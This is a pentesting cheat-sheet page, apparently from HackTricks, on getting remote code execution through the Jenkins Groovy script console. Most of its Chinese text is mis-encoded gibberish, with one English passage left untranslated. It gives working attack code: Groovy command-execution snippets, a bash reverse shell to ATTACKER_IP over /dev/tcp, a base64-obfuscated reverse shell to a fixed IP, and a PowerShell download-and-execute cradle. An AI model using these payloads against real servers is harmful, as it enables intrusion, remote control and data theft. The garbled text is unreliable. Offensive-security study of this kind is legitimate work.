# Jenkinsä½¿ç”¨Groovyè„šæœ¬è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Jenkinsä½¿ç”¨Groovyè„šæœ¬è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

è¿™æ¯”åœ¨Jenkinsä¸­åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®è¦æ›´ç®€æ´ã€‚

1. è½¬åˆ° _path\_jenkins/script_
2. åœ¨æ–‡æœ¬æ¡†ä¸­è¾“å…¥è„šæœ¬
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼š`cmd.exe /c dir`

åœ¨**Linux**ä¸­ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š**`"ls /".execute().text`**

å¦‚æœæ‚¨éœ€è¦åœ¨æ–‡æœ¬ä¸­ä½¿ç”¨_å¼•å·_å’Œ_å•å¼•å·_ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨_"""PAYLOAD"""_ï¼ˆä¸‰ä¸ªåŒå¼•å·ï¼‰æ¥æ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚

**å¦ä¸€ä¸ªæœ‰ç”¨çš„Groovyè„šæœ¬**æ˜¯ï¼ˆæ›¿æ¢\[æ’å…¥å‘½ä»¤]ï¼‰ï¼š
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### åœ¨Linuxä¸­çš„åå‘Shell

A reverse shell is a technique used in penetration testing to gain remote access to a target machine. It involves establishing a connection from the target machine to the attacker's machine, allowing the attacker to execute commands on the target machine.

To create a reverse shell in Linux, you can use the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.

This command redirects the input and output of the bash shell to a TCP connection established with the attacker's machine. It effectively creates a reverse shell, allowing the attacker to interact with the target machine's command line.

Once the reverse shell is established, the attacker can execute commands on the target machine as if they were physically present. This can be used to perform various actions, such as exploring the file system, running privilege escalation exploits, or exfiltrating sensitive data.

It's important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used in controlled environments for legitimate purposes, such as penetration testing or network administration.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### åœ¨Windowsä¸­çš„åå‘Shell

æ‚¨å¯ä»¥å‡†å¤‡ä¸€ä¸ªå¸¦æœ‰PowerShellåå‘Shellçš„HTTPæœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨Jenkinsä¸‹è½½å¹¶æ‰§è¡Œå®ƒï¼š
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### è„šæœ¬

æ‚¨å¯ä»¥ä½¿ç”¨[**æ­¤è„šæœ¬**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py)è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨MSFè·å–åå‘shellï¼š
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
